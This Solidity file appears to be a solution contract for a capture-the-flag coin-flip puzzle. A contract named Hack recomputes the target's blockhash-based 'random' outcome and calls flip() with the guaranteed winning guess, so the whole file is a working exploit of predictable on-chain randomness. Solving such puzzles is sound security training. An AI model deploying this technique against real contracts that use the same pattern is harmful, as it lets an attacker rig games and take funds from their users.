// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}

contract Hack {
  address public expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
  function exploit(address aimAddr) public {
    expFlip = aimAddr;
  }

  function hack() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    CoinFlipInterface(expFlip).flip(guess);
  }
}